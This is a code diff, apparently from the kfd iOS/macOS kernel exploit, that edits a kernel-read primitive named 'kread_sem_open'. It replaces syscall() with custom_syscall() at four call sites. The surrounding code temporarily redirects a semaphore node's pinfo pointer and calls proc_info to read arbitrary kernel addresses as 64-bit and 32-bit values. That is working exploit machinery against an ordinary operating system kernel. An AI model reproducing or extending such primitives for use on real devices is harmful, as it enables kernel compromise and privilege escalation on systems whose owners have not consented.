@@ -35,7 +35,7 @@ void kread_sem_open_init(struct kfd* kfd)
     u64 arg = sem_fd;
     u64 buffer = (u64)(sem_data);
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
-    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+    assert(custom_syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 }
 
 void kread_sem_open_allocate(struct kfd* kfd, u64 id)
@@ -72,7 +72,7 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
 
             const u64 shift_amount = 4;
             pnode[0].pinfo += shift_amount;
-            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+            assert(custom_syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
             pnode[0].pinfo -= shift_amount;
 
             if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
@@ -158,7 +158,7 @@ u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
     u64 arg = kread_fd;
     u64 buffer = (u64)(&data);
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
-    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+    assert(custom_syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
     pnode->pinfo = old_pinfo;
     return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
@@ -186,7 +186,7 @@ u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
     u64 arg = kread_fd;
     u64 buffer = (u64)(&data);
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
-    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+    assert(custom_syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
     pnode->pinfo = old_pinfo;
     return *(u32*)(&data.pseminfo.psem_stat.vst_size);
